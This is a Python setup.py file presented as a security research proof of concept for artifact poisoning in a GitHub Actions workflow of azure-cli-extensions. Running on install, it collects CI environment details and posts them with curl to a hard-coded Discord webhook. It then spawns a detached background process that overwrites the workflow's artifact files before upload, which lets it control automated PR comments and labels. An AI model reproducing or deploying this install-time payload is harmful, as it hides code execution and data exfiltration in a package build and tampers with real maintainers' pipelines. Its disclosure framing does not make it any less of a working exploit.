#!/usr/bin/env python

# Security research PoC - demonstrates artifact poisoning via pull_request_target
# Reported to MSRC as part of responsible disclosure.

import os
import json
import subprocess
import datetime

poc_data = {
    "source": "setup.py",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

# Webhook callback
webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

message = json.dumps({
    "content": (
        "**PoC: artifact poisoning attempt - azure-cli-extensions**\n"
        "```\n"
        f"Repo: {poc_data['github_repository']}\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Event: {poc_data['github_event_name']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "Background overwrite process started."
    )
})

try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", message, webhook_url],
        timeout=10, capture_output=True
    )
except Exception:
    pass

# Artifact poisoning via background process
# release_version_cal.py overwrites our content, so we need to wait
# for it to finish, then overwrite AFTER it but BEFORE artifact upload
cal_result = os.path.join(os.getcwd(), "cal_result")
run_id = poc_data["github_run_id"]
ts = poc_data["timestamp"]

# Launch a background process that waits 30 seconds then overwrites
# the artifact files right before upload
overwrite_script = f"""
import time, os
time.sleep(30)
cal = "{cal_result}"
if os.path.isdir(cal):
    with open(os.path.join(cal, "version_update.txt"), "w") as f:
        f.write(
            "## Responsible Disclosure Notice\\n\\n"
            "This automated comment was generated as part of an authorized security "
            "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
            "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
            "misconfiguration.\\n\\n"
            "**Finding:** An external contributor can control the content of this "
            "automated comment and manipulate PR labels by modifying artifact files "
            "during the `version-cal` job, which checks out and executes code from "
            "the pull request head branch.\\n\\n"
            "This issue has been reported to the Microsoft Security Response Center (MSRC) "
            "as part of responsible disclosure. No secrets were accessed and no "
            "unauthorized modifications were made.\\n\\n"
            "*Researcher: Bodlux | Run ID: {run_id} | Timestamp: {ts}*"
        )
    with open(os.path.join(cal, "labels_removed.txt"), "w") as f:
        f.write("")
"""

subprocess.Popen(
    ["python3", "-c", overwrite_script],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    start_new_session=True
)

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC',
    author='Bodlux',
    license='MIT',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
